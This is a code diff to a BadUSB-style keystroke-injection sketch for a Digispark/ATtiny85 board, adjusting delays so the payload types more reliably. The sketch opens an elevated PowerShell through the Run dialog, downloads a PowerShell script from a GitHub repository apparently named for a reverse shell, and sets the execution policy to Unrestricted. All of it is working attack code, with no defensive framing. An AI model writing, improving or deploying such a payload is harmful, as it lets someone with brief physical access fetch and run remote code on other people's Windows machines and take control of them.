@@ -14,8 +14,9 @@ void setup() {
 void loop(){
 
   DigiKeyboard.update();
-  DigiKeyboard.sendKeyStroke('r', KEY_LEFT_GUI);
   DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke('r', KEY_LEFT_GUI);
+  DigiKeyboard.delay(700);
   DigiKeyboard.print("Run");
   DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);  
   DigiKeyboard.delay(500);
@@ -32,6 +33,7 @@ void loop(){
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.print("$client.DownloadFile('https://raw.githubusercontent.com/XALM1337X/attiny85_rshell/master/rs_tsk.ps1', 'C:\\rs_tsk.ps1')");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1500);
   
   DigiKeyboard.print("Set-ExecutionPolicy -ExecutionPolicy Unrestricted");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
